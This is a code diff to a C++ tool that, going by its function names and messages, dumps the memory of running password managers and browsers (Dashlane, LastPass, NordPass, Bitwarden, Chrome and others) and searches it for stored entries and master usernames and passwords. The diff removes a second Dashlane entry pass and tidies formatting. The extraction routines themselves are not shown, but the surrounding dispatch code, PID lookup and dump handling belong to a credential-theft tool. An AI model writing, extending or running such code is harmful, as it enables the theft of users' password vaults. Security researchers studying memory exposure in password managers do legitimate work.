@@ -25,7 +25,6 @@
 #include "../nordpass/app/getCredsnordpass1.h"
 #include "../nordpass/app/getCredsnordpass2.h"
 #include "../dashlane/getCredsdashlaneEntries.h"
-#include "../dashlane/getCredsdashlaneEntries2.h"
 #include "../dashlane/getCredsdashlaneMaster.h"
 #include "../lastpass/getCredslastpassEntries.h"
 #include "../lastpass/getCredslastpassMasterPass.h"
@@ -357,7 +356,7 @@ int checkApps() {
             getCredschromium(fileInput);
             std::cout << "Done!\n";
             std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
-            }
+        }
     }
 
     //keeper
@@ -612,7 +611,7 @@ int checkApps() {
                 std::wcerr << L"Failed to get the current user's login name." << std::endl;
                 return 1;
             }
-            
+
             const char* processName = "chrome.exe";
             // Step 1: Find PIDs by process name
             std::vector<DWORD> pids;
@@ -690,7 +689,7 @@ int checkApps() {
         }
 
 
-            processName = "chrome.exe";   
+        processName = "chrome.exe";
 
         // Step 1: Find PIDs by process name
         std::vector<DWORD> pids;
@@ -735,11 +734,8 @@ int checkApps() {
             fileInput = "app.dmp";
         }
 
-        std::cout << "Searching for entries (1/2).\n";
+        std::cout << "Searching for entries.\n";
         getCredsdashlaneEntries(fileInput);
-        std::cout << "Done!\n";
-        std::cout << "Searching for entries (2/2).\n";
-        getCredsdashlaneEntries2(fileInput);
         std::cout << "Done!\n";
         std::cout << "Searching for master username and password.\n";
         getCredsdashlaneMaster(fileInput);
@@ -1562,8 +1558,8 @@ int checkApps() {
         && userInput != "keeper" && userInput != "chrome" && userInput != "brave"
         && userInput != "msedge" && userInput != "lastpass" && userInput != "nordpass" && userInput != "roboform"
         && userInput != "bitwarden" && userInput != "norton" && userInput != "bitdefender"
-        && userInput != "ironvest" && userInput != "passwarden" && userInput != "avira" && userInput != "opera"
-        && userInput != "passwordboss" && userInput != "kaspersky") {
+        && userInput != "ironvest" && userInput != "passwarden" && userInput != "avira" 
+        && userInput != "opera"    && userInput != "passwordboss" && userInput != "kaspersky") {
         std::cout << "User input did not match a specific password manager.\n";
         std::cout << "The input must be case-sensitive.\n";
         return 1;
